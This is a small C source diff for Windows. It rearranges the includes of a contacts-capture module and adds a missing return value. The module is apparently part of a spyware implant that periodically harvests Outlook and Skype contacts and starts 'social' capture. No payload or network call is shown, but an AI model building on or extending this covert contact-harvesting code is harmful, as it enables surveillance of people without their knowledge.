@@ -1,4 +1,19 @@
-#include "HM_ContactAgent/OLABMAPI.h"
+#define _CRT_SECURE_NO_WARNINGS 1
+
+#include <Windows.h>
+#include <stdio.h>
+#include <json/JSON.h>
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/LOG.h"
+#include "../../H4DLL/H4-DLL.h"
+#include "../../H4DLL/HM_SafeProcedures.h"
+#include "../../H4DLL/bin_string.h"
+#include "../../H4DLL/bss.h"
+#include "../../H4DLL/AM_Core.h"
+
+#include "../imagent/HM_SkypeRecord.h"
+
+#include "OLABMAPI.h"
 extern void StartSocialCapture(); // Per far partire le opzioni "social"
 
 #define CONTACTS_SLEEP_TIME (1000*60*60*3) //millisecondi  (ogni 3 ore)
@@ -201,6 +216,7 @@ DWORD __stdcall PM_ContactsDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILET
 			SendRequestContacts(skype_api_wnd, skype_pm_wnd);
 		return 1;
 	}
+	return 0;
 }
 
 
